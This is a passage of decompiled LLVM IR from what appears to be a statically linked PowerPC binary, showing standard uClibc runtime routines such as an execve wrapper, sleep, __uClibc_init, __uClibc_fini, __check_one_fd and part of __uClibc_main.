  %v3_10011458 = icmp eq i32 %v2_10011454, 0
  br i1 %v3_10011458, label %dec_label_pc_10011460, label %dec_label_pc_10011424

dec_label_pc_10011460:                            ; preds = %dec_label_pc_10011454
  %v1_10011460 = mul i32 %v1_10011428, 4
  store i32 %v4_100113d4, i32* %r0.global-to-local, align 4
  %v1_10011468 = add i32 %v1_10011460, 34
  store i32 %v1_10011428, i32* %ctr.global-to-local, align 4
  %v1_10011470 = call i32 @__asm_rlwinm(i32 %v1_10011468, i32 0, i32 0, i32 27)
  %v1_10011478 = load i32, i32* @r1, align 4
  %v3_10011478 = sub i32 %v1_10011478, %v1_10011470
  %v4_10011478 = inttoptr i32 %v3_10011478 to i32*
  store i32 %v4_100113d4, i32* %v4_10011478, align 4
  %v1_1001147c = add i32 %v3_10011478, 23
  store i32 %v1_1001147c, i32* %r0.global-to-local, align 4
  %v1_10011480 = call i32 @__asm_rlwinm(i32 %v1_1001147c, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_10011488 = load i32, i32* %r8.global-to-local, align 4
  %v2_10011488 = inttoptr i32 %v1_10011480 to i32*
  store i32 %v0_10011488, i32* %v2_10011488, align 4
  store i32 %v1_10011480, i32* %r11.global-to-local, align 4
  %v0_10011490 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011490 = trunc i32 %v0_10011490 to i8
  store i32 %v2_100113f0, i32* %r0.global-to-local, align 4
  store i32 %v2_100113f0, i32* %stack_var_-48, align 4
  br label %dec_label_pc_100114a4

dec_label_pc_100114a4:                            ; preds = %dec_label_pc_100114d8.dec_label_pc_100114a4_crit_edge, %dec_label_pc_10011460
  %v0_100114a8 = phi i32 [ %v1_10011480, %dec_label_pc_10011460 ], [ %v0_100114a8.pre, %dec_label_pc_100114d8.dec_label_pc_100114a4_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_100113f8, %dec_label_pc_10011460 ], [ %stack_var_-52.3, %dec_label_pc_100114d8.dec_label_pc_100114a4_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_10011490, %dec_label_pc_10011460 ], [ %stack_var_-56.3, %dec_label_pc_100114d8.dec_label_pc_100114a4_crit_edge ]
  %v1_100114a8 = add i32 %v0_100114a8, 4
  store i32 %v1_100114a8, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_100114cc, label %dec_label_pc_100114bc

dec_label_pc_100114bc:                            ; preds = %dec_label_pc_100114a4
  %v4_100114a4 = zext i8 %stack_var_-56.2 to i32
  %v1_100114b4 = add i8 %stack_var_-56.2, 1
  %v1_100114b0 = mul nuw nsw i32 %v4_100114a4, 4
  %v3_100114bc = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_100114bc, i32* %r0.global-to-local, align 4
  %v2_100114c4 = add i32 %v3_100114bc, %v1_100114b0
  br label %dec_label_pc_100114d8

dec_label_pc_100114cc:                            ; preds = %dec_label_pc_100114a4
  %v1_100114d0 = add i32 %stack_var_-52.2, 4
  store i32 %v1_100114d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100114d8

dec_label_pc_100114d8:                            ; preds = %dec_label_pc_100114bc, %dec_label_pc_100114cc
  %stack_var_-52.3 = phi i32 [ %v1_100114d0, %dec_label_pc_100114cc ], [ %stack_var_-52.2, %dec_label_pc_100114bc ]
  %v0_100114d8 = phi i32 [ %stack_var_-52.2, %dec_label_pc_100114cc ], [ %v2_100114c4, %dec_label_pc_100114bc ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_100114cc ], [ %v1_100114b4, %dec_label_pc_100114bc ]
  %v1_100114d8 = inttoptr i32 %v0_100114d8 to i32*
  %v2_100114d8 = load i32, i32* %v1_100114d8, align 4
  store i32 %v2_100114d8, i32* %r0.global-to-local, align 4
  %v2_100114dc = inttoptr i32 %v1_100114a8 to i32*
  store i32 %v2_100114d8, i32* %v2_100114dc, align 4
  %v0_100114e0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100114e0 = add i32 %v0_100114e0, -1
  store i32 %v1_100114e0, i32* %ctr.global-to-local, align 4
  %v2_100114e0 = icmp eq i32 %v1_100114e0, 0
  br i1 %v2_100114e0, label %dec_label_pc_100114e4, label %dec_label_pc_100114d8.dec_label_pc_100114a4_crit_edge

dec_label_pc_100114d8.dec_label_pc_100114a4_crit_edge: ; preds = %dec_label_pc_100114d8
  %v0_100114a8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100114a4

dec_label_pc_100114e4:                            ; preds = %dec_label_pc_100114d8
  %v3_100114e8 = load i32, i32* @global_var_1002abf4.661, align 4
  store i32 268506352, i32* @lr, align 4
  %v2_100114ec = call i32 @__GI_execve(i32 %v3_100114e8, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_100114f0 = load i32, i32* @r1, align 4
  %v1_100114f0 = inttoptr i32 %v0_100114f0 to i32*
  %v2_100114f0 = load i32, i32* %v1_100114f0, align 4
  store i32 %v2_100114f0, i32* %r11.global-to-local, align 4
  %v1_100114f4 = add i32 %v2_100114f0, 4
  %v2_100114f4 = inttoptr i32 %v1_100114f4 to i32*
  %v3_100114f4 = load i32, i32* %v2_100114f4, align 4
  store i32 %v3_100114f4, i32* %r0.global-to-local, align 4
  ret i32 %v2_100114ec

; uselistorder directives
  uselistorder i32 %v1_100114e0, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_10011430, { 1, 0 }
  uselistorder i32 %v1_10011428, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_100113f0, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32 27, { 3, 4, 1, 2, 0, 5 }
  uselistorder i8 1, { 0, 1, 10, 11, 12, 13, 17, 18, 15, 16, 2, 3, 19, 14, 9, 8, 7, 6, 5, 4, 20 }
  uselistorder label %dec_label_pc_100114d8, { 1, 0 }
  uselistorder label %dec_label_pc_10011454, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_10011508 = icmp eq i32 %arg1, 0
  br i1 %v3_10011508, label %dec_label_pc_100116bc, label %dec_label_pc_10011538.lr.ph

dec_label_pc_10011538.lr.ph:                      ; preds = %entry
  %v2_1001152c = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_1001152c, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1001153842 = add i32 %v2_1001152c, 132
  %v3_1001153843 = inttoptr i32 %v2_1001153842 to i32*
  store i32 0, i32* %v3_1001153843, align 4
  %v0_1001153c44 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001153c45 = add i32 %v0_1001153c44, -1
  store i32 %v1_1001153c45, i32* %r11.global-to-local, align 4
  %v1_1001154046 = mul i32 %v1_1001153c45, 4
  %v1_1001154447 = load i32, i32* %r7.global-to-local, align 4
  %v2_1001154448 = add i32 %v1_1001154447, %v1_1001154046
  %v0_1001154849 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001154850 = add i32 %v0_1001154849, -1
  store i32 %v1_1001154850, i32* %ctr.global-to-local, align 4
  %v2_1001154851 = icmp eq i32 %v1_1001154850, 0
  br i1 %v2_1001154851, label %dec_label_pc_1001154c, label %dec_label_pc_10011538.dec_label_pc_10011538_crit_edge

dec_label_pc_10011538.dec_label_pc_10011538_crit_edge: ; preds = %dec_label_pc_10011538.lr.ph, %dec_label_pc_10011538.dec_label_pc_10011538_crit_edge
  %v2_1001154452 = phi i32 [ %v2_10011544, %dec_label_pc_10011538.dec_label_pc_10011538_crit_edge ], [ %v2_1001154448, %dec_label_pc_10011538.lr.ph ]
  %v0_10011538.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_10011538 = add i32 %v2_1001154452, 8
  %v3_10011538 = inttoptr i32 %v2_10011538 to i32*
  store i32 %v0_10011538.pre, i32* %v3_10011538, align 4
  %v0_1001153c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001153c = add i32 %v0_1001153c, -1
  store i32 %v1_1001153c, i32* %r11.global-to-local, align 4
  %v1_10011540 = mul i32 %v1_1001153c, 4
  %v1_10011544 = load i32, i32* %r7.global-to-local, align 4
  %v2_10011544 = add i32 %v1_10011544, %v1_10011540
  %v0_10011548 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011548 = add i32 %v0_10011548, -1
  store i32 %v1_10011548, i32* %ctr.global-to-local, align 4
  %v2_10011548 = icmp eq i32 %v1_10011548, 0
  br i1 %v2_10011548, label %dec_label_pc_1001154c, label %dec_label_pc_10011538.dec_label_pc_10011538_crit_edge

dec_label_pc_1001154c:                            ; preds = %dec_label_pc_10011538.dec_label_pc_10011538_crit_edge, %dec_label_pc_10011538.lr.ph
  %v0_10011560.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_1001154c = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_1001154c, i32* %r29.global-to-local, align 4
  store i32 %v2_1001154c, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  store i32 %v0_10011560.pre, i32* %stack_var_-440, align 4
  %v0_10011564 = call i32 @__sigaddset()
  store i32 %v0_10011564, i32* %r3.global-to-local, align 4
  %v1_10011568 = icmp slt i32 %v0_10011564, 0
  br i1 %v1_10011568, label %dec_label_pc_100116c4, label %dec_label_pc_10011570

dec_label_pc_10011570:                            ; preds = %dec_label_pc_1001154c
  %v2_10011570 = ptrtoint i32* %stack_var_-304 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268506500, i32* @lr, align 4
  %v3_10011580 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_1001154c, i32 %v2_10011570)
  store i32 %v3_10011580, i32* %r3.global-to-local, align 4
  %v3_10011584 = icmp eq i32 %v3_10011580, 0
  br i1 %v3_10011584, label %dec_label_pc_1001158c, label %dec_label_pc_100116c4

dec_label_pc_1001158c:                            ; preds = %dec_label_pc_10011570
  store i32 %v2_10011570, i32* %r3.global-to-local, align 4
  %v2_10011594 = call i32 @__sigismember(i32 %v2_10011570, i32 17)
  store i32 %v2_10011594, i32* %r3.global-to-local, align 4
  %v3_10011598 = icmp eq i32 %v2_10011594, 0
  br i1 %v3_10011598, label %dec_label_pc_100115b8.lr.ph, label %dec_label_pc_10011684

dec_label_pc_100115b8.lr.ph:                      ; preds = %dec_label_pc_1001158c
  store i32 %v2_1001152c, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_1001153843, align 4
  %v0_100115bc33 = load i32, i32* %r11.global-to-local, align 4
  %v1_100115bc34 = add i32 %v0_100115bc33, -1
  store i32 %v1_100115bc34, i32* %r11.global-to-local, align 4
  %v1_100115c035 = mul i32 %v1_100115bc34, 4
  %v1_100115c436 = load i32, i32* %r8.global-to-local, align 4
  %v2_100115c437 = add i32 %v1_100115c436, %v1_100115c035
  %v0_100115c838 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100115c839 = add i32 %v0_100115c838, -1
  store i32 %v1_100115c839, i32* %ctr.global-to-local, align 4
  %v2_100115c840 = icmp eq i32 %v1_100115c839, 0
  br i1 %v2_100115c840, label %dec_label_pc_100115cc, label %dec_label_pc_100115b8.dec_label_pc_100115b8_crit_edge

dec_label_pc_100115b8.dec_label_pc_100115b8_crit_edge: ; preds = %dec_label_pc_100115b8.lr.ph, %dec_label_pc_100115b8.dec_label_pc_100115b8_crit_edge
  %v2_100115c441 = phi i32 [ %v2_100115c4, %dec_label_pc_100115b8.dec_label_pc_100115b8_crit_edge ], [ %v2_100115c437, %dec_label_pc_100115b8.lr.ph ]
  %v0_100115b8.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_100115b8 = add i32 %v2_100115c441, 8
  %v3_100115b8 = inttoptr i32 %v2_100115b8 to i32*
  store i32 %v0_100115b8.pre, i32* %v3_100115b8, align 4
  %v0_100115bc = load i32, i32* %r11.global-to-local, align 4
  %v1_100115bc = add i32 %v0_100115bc, -1
  store i32 %v1_100115bc, i32* %r11.global-to-local, align 4
  %v1_100115c0 = mul i32 %v1_100115bc, 4
  %v1_100115c4 = load i32, i32* %r8.global-to-local, align 4
  %v2_100115c4 = add i32 %v1_100115c4, %v1_100115c0
  %v0_100115c8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100115c8 = add i32 %v0_100115c8, -1
  store i32 %v1_100115c8, i32* %ctr.global-to-local, align 4
  %v2_100115c8 = icmp eq i32 %v1_100115c8, 0
  br i1 %v2_100115c8, label %dec_label_pc_100115cc, label %dec_label_pc_100115b8.dec_label_pc_100115b8_crit_edge

dec_label_pc_100115cc:                            ; preds = %dec_label_pc_100115b8.dec_label_pc_100115b8_crit_edge, %dec_label_pc_100115b8.lr.ph
  store i32 %v2_1001154c, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_100115d4 = call i32 @__sigaddset()
  store i32 %v0_100115d4, i32* %r3.global-to-local, align 4
  %v1_100115d8 = icmp slt i32 %v0_100115d4, 0
  br i1 %v1_100115d8, label %dec_label_pc_100116c4, label %dec_label_pc_100115e0

dec_label_pc_100115e0:                            ; preds = %dec_label_pc_100115cc
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_100115e8 = ptrtoint i32* %stack_var_-176 to i32
  store i32 268506608, i32* @lr, align 4
  %v4_100115ec = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_100115e8)
  store i32 %v4_100115ec, i32* %r3.global-to-local, align 4
  %tmp30 = icmp sgt i32 %v4_100115ec, -1
  br i1 %tmp30, label %dec_label_pc_10011620, label %dec_label_pc_100115f8

dec_label_pc_100115f8:                            ; preds = %dec_label_pc_100115e0
  %v0_100115f8 = call i32 @__errno_location()
  store i32 %v0_100115f8, i32* %r3.global-to-local, align 4
  %v1_10011600 = inttoptr i32 %v0_100115f8 to i32*
  %v2_10011600 = load i32, i32* %v1_10011600, align 4
  store i32 %v0_100115f8, i32* %r29.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268506644, i32* @lr, align 4
  %v3_10011610 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10011570, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_10011618 = inttoptr i32 %v0_100115f8 to i32*
  store i32 %v2_10011600, i32* %v2_10011618, align 4
  %v0_100116d8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100116c8

dec_label_pc_10011620:                            ; preds = %dec_label_pc_100115e0
  %v3_10011620 = load i32, i32* %stack_var_-176, align 4
  %v3_1001162c = icmp eq i32 %v3_10011620, 1
  br i1 %v3_1001162c, label %dec_label_pc_10011634, label %dec_label_pc_10011668

dec_label_pc_10011634:                            ; preds = %dec_label_pc_10011620
  store i32 %v2_1001152c, i32* %r3.global-to-local, align 4
  store i32 268506688, i32* @lr, align 4
  %v2_1001163c = call i32 @__libc_nanosleep(i32 %v2_1001152c, i32 %v2_1001152c)
  store i32 %v2_1001163c, i32* %r3.global-to-local, align 4
  store i32 %v2_1001163c, i32* @r31, align 4
  %v0_10011644 = call i32 @__errno_location()
  store i32 %v0_10011644, i32* %r3.global-to-local, align 4
  store i32 %v0_10011644, i32* %r29.global-to-local, align 4
  %v1_10011654 = inttoptr i32 %v0_10011644 to i32*
  %v2_10011654 = load i32, i32* %v1_10011654, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268506720, i32* @lr, align 4
  %v3_1001165c = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10011570, i32 0)
  store i32 %v3_1001165c, i32* %r3.global-to-local, align 4
  %v1_10011660 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011660 = inttoptr i32 %v1_10011660 to i32*
  store i32 %v2_10011654, i32* %v2_10011660, align 4
  %v0_10011690.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011690

dec_label_pc_10011668:                            ; preds = %dec_label_pc_10011620
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268506744, i32* @lr, align 4
  %v3_10011674 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10011570, i32 0)
  br label %dec_label_pc_10011684

dec_label_pc_10011684:                            ; preds = %dec_label_pc_1001158c, %dec_label_pc_10011668
  store i32 %v2_1001152c, i32* %r3.global-to-local, align 4
  store i32 268506764, i32* @lr, align 4
  %v2_10011688 = call i32 @__libc_nanosleep(i32 %v2_1001152c, i32 %v2_1001152c)
  store i32 %v2_10011688, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011690

dec_label_pc_10011690:                            ; preds = %dec_label_pc_10011634, %dec_label_pc_10011684
  %v0_10011690 = phi i32 [ %v0_10011690.pr, %dec_label_pc_10011634 ], [ %v2_10011688, %dec_label_pc_10011684 ]
  %v3_10011690 = icmp eq i32 %v0_10011690, 0
  br i1 %v3_10011690, label %dec_label_pc_100116bc, label %dec_label_pc_10011698

dec_label_pc_10011698:                            ; preds = %dec_label_pc_10011690
  %v3_100116a8 = load i32, i32* %stack_var_-440, align 4
  %v0_100116ac = call i32 @__asm_mfcr()
  store i32 %v0_100116ac, i32* %r3.global-to-local, align 4
  %v1_100116b0 = call i32 @__asm_rlwinm(i32 %v0_100116ac, i32 30, i32 31, i32 31)
  %v2_100116b4 = add i32 %v3_100116a8, %v1_100116b0
  store i32 %v2_100116b4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100116c8

dec_label_pc_100116bc:                            ; preds = %dec_label_pc_10011690, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100116c8

dec_label_pc_100116c4:                            ; preds = %dec_label_pc_10011570, %dec_label_pc_100115cc, %dec_label_pc_1001154c
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100116c8

dec_label_pc_100116c8:                            ; preds = %dec_label_pc_100116bc, %dec_label_pc_10011698, %dec_label_pc_100115f8, %dec_label_pc_100116c4
  %v0_100116d8 = phi i32 [ 0, %dec_label_pc_100116bc ], [ %v2_100116b4, %dec_label_pc_10011698 ], [ %v0_100116d8.pre, %dec_label_pc_100115f8 ], [ -1, %dec_label_pc_100116c4 ]
  ret i32 %v0_100116d8

; uselistorder directives
  uselistorder i32 %v1_100115c8, { 1, 0 }
  uselistorder i32 %v2_10011570, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v1_10011548, { 1, 0 }
  uselistorder i32 %v2_1001152c, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 5, 4, 0, 6, 2, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 1 }
  uselistorder i32* %r11.global-to-local, { 3, 2, 0, 6, 7, 5, 4, 1, 8, 9 }
  uselistorder i32* %ctr.global-to-local, { 3, 2, 0, 6, 7, 5, 4, 1, 8, 9 }
  uselistorder i32 (i32, i32)* @__libc_nanosleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder label %dec_label_pc_100116c8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100116c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011690, { 1, 0 }
  uselistorder label %dec_label_pc_10011684, { 1, 0 }
  uselistorder label %dec_label_pc_100115b8.dec_label_pc_100115b8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10011538.dec_label_pc_10011538_crit_edge, { 1, 0 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_1001172c:
  %v3_10011730 = load i32, i32* @global_var_1002abfc.663, align 4
  %v3_10011734 = icmp eq i32 %v3_10011730, 0
  br i1 %v3_10011734, label %dec_label_pc_10011744, label %dec_label_pc_1001173c

dec_label_pc_1001173c:                            ; preds = %dec_label_pc_1001172c
  %v2_10011740 = load i32, i32* @r4, align 4
  %v3_10011740 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 %v2_10011740)
  store i32 %v3_10011740, i32* @r3, align 4
  br label %dec_label_pc_10011744

dec_label_pc_10011744:                            ; preds = %dec_label_pc_1001172c, %dec_label_pc_1001173c
  %v3_10011748 = load i32, i32* @global_var_1002ac00.664, align 4
  %v3_1001174c = icmp eq i32 %v3_10011748, 0
  br i1 %v3_1001174c, label %dec_label_pc_10011744.dec_label_pc_1001175c_crit_edge, label %dec_label_pc_10011754

dec_label_pc_10011744.dec_label_pc_1001175c_crit_edge: ; preds = %dec_label_pc_10011744
  %v0_1001176c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1001175c

dec_label_pc_10011754:                            ; preds = %dec_label_pc_10011744
  %v2_10011758 = load i32, i32* @r4, align 4
  %v3_10011758 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 %v2_10011758)
  br label %dec_label_pc_1001175c

dec_label_pc_1001175c:                            ; preds = %dec_label_pc_10011744.dec_label_pc_1001175c_crit_edge, %dec_label_pc_10011754
  %v0_1001176c = phi i32 [ %v0_1001176c.pre, %dec_label_pc_10011744.dec_label_pc_1001175c_crit_edge ], [ %v3_10011758, %dec_label_pc_10011754 ]
  ret i32 %v0_1001176c

; uselistorder directives
  uselistorder i32 (i32, i32)* @unknown_0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001175c, { 1, 0 }
  uselistorder label %dec_label_pc_10011744, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_10011778 = load i32, i32* @r3, align 4
  ret i32 %v0_10011778
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268507040, i32* @lr, align 4
  %v2_1001179c = call i32 @__libc_fcntl(i32 1, i32 1)
  %v3_100117a0 = icmp eq i32 %v2_1001179c, -1
  br i1 %v3_100117a0, label %dec_label_pc_100117a8, label %dec_label_pc_100117c8

dec_label_pc_100117a8:                            ; preds = %entry
  %v0_100117ac = load i32, i32* @r30, align 4
  store i32 268507068, i32* @lr, align 4
  %v3_100117b8 = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_1001a260.665 to i32), i32 %v0_100117ac)
  %v1_100117bc = load i32, i32* @r31, align 4
  %v4_100117bc = icmp eq i32 %v3_100117b8, %v1_100117bc
  br i1 %v4_100117bc, label %dec_label_pc_100117c8, label %dec_label_pc_100117c4

dec_label_pc_100117c4:                            ; preds = %dec_label_pc_100117a8
  %v1_100117c4 = call i32 @abort(i32 %v3_100117b8)
  br label %dec_label_pc_100117c8

dec_label_pc_100117c8:                            ; preds = %entry, %dec_label_pc_100117a8, %dec_label_pc_100117c4
  %v0_100117d8 = phi i32 [ %v2_1001179c, %entry ], [ %v3_100117b8, %dec_label_pc_100117a8 ], [ %v1_100117c4, %dec_label_pc_100117c4 ]
  ret i32 %v0_100117d8

; uselistorder directives
  uselistorder label %dec_label_pc_100117c8, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v3_100117fc = load i32, i32* @global_var_1002ac04.666, align 4
  %v3_10011800 = icmp eq i32 %v3_100117fc, 0
  br i1 %v3_10011800, label %dec_label_pc_10011824, label %entry.dec_label_pc_10011848_crit_edge

entry.dec_label_pc_10011848_crit_edge:            ; preds = %entry
  %v0_10011858.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10011848

dec_label_pc_10011824:                            ; preds = %entry
  store i32 1, i32* @global_var_1002ac04.666, align 4
  store i32 4096, i32* @global_var_1002abf8.640, align 4
  %v1_10011844 = call i32 @_stdio_init(i32 268492904)
  br label %dec_label_pc_10011848

dec_label_pc_10011848:                            ; preds = %entry.dec_label_pc_10011848_crit_edge, %dec_label_pc_10011824
  %v0_10011858 = phi i32 [ %v0_10011858.pre, %entry.dec_label_pc_10011848_crit_edge ], [ %v1_10011844, %dec_label_pc_10011824 ]
  ret i32 %v0_10011858

; uselistorder directives
  uselistorder label %dec_label_pc_10011848, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_10011874 = mul i32 %arg2, 4
  %v2_10011878 = add i32 %tmp, %v1_10011874
  %v0_1001187c = load i32, i32* @r9, align 4
  store i32 %v0_1001187c, i32* @global_var_1002abf0.667, align 4
  %v1_10011880 = add i32 %v2_10011878, 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 %v1_10011880, i32* @global_var_1002abf4.661, align 4
  store i32 %arg6, i32* @global_var_1002ac00.664, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  %v2_100118a0 = load i32, i32* %arg3, align 4
  store i32 %arg5, i32* @r27, align 4
  %v4_100118a8 = icmp eq i32 %v1_10011880, %v2_100118a0
  br i1 %v4_100118a8, label %dec_label_pc_100118b0, label %dec_label_pc_100118b4

dec_label_pc_100118b0:                            ; preds = %entry
  store i32 %v2_10011878, i32* @global_var_1002abf4.661, align 4
  br label %dec_label_pc_100118b4

dec_label_pc_100118b4:                            ; preds = %entry, %dec_label_pc_100118b0
  %v2_100118b4 = ptrtoint i32* %stack_var_-168 to i32
  store i32 268507332, i32* @lr, align 4
  %v3_100118c0 = call i32 @__GI_memset(i32 %v2_100118b4, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_1002abf4.661, align 4
  br label %dec_label_pc_100118d0

dec_label_pc_100118d0:                            ; preds = %dec_label_pc_100118d0, %dec_label_pc_100118b4
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_100118b4 ], [ %v1_100118d4, %dec_label_pc_100118d0 ]
  %v1_100118d0 = inttoptr i32 %storemerge to i32*
  %v2_100118d0 = load i32, i32* %v1_100118d0, align 4
  %v1_100118d4 = add i32 %storemerge, 4
  %v3_100118d8 = icmp eq i32 %v2_100118d0, 0
  br i1 %v3_100118d8, label %dec_label_pc_100118e0, label %dec_label_pc_100118d0

dec_label_pc_100118e0:                            ; preds = %dec_label_pc_100118d0
  store i32 %v1_100118d4, i32* %r29.global-to-local, align 4
  %v1_1001190c12 = inttoptr i32 %v1_100118d4 to i32*
  %v2_1001190c13 = load i32, i32* %v1_1001190c12, align 4
  %v3_1001191016 = icmp eq i32 %v2_1001190c13, 0
  br i1 %v3_1001191016, label %dec_label_pc_10011918, label %dec_label_pc_100118e8

dec_label_pc_100118e8:                            ; preds = %dec_label_pc_100118e0, %dec_label_pc_10011908
  %v0_100118fc = phi i32 [ %v1_10011908, %dec_label_pc_10011908 ], [ %v1_100118d4, %dec_label_pc_100118e0 ]
  %v0_100118f0 = phi i32 [ %v2_1001190c, %dec_label_pc_10011908 ], [ %v2_1001190c13, %dec_label_pc_100118e0 ]
  %v2_100118e8 = icmp ugt i32 %v0_100118f0, 14
  br i1 %v2_100118e8, label %dec_label_pc_10011908, label %dec_label_pc_100118f0

dec_label_pc_100118f0:                            ; preds = %dec_label_pc_100118e8
  %v1_100118f0 = mul i32 %v0_100118f0, 8
  %v2_100118f8 = add i32 %v1_100118f0, %v2_100118b4
  store i32 %v2_100118f8, i32* @r3, align 4
  store i32 %v0_100118fc, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268507400, i32* @lr, align 4
  %v0_10011904 = call i32 @memcpy()
  %v0_10011908.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10011908

dec_label_pc_10011908:                            ; preds = %dec_label_pc_100118e8, %dec_label_pc_100118f0
  %v0_10011908 = phi i32 [ %v0_100118fc, %dec_label_pc_100118e8 ], [ %v0_10011908.pre, %dec_label_pc_100118f0 ]
  %v1_10011908 = add i32 %v0_10011908, 8
  store i32 %v1_10011908, i32* %r29.global-to-local, align 4
  %v1_1001190c = inttoptr i32 %v1_10011908 to i32*
  %v2_1001190c = load i32, i32* %v1_1001190c, align 4
  %v3_10011910 = icmp eq i32 %v2_1001190c, 0
  br i1 %v3_10011910, label %dec_label_pc_10011918, label %dec_label_pc_100118e8

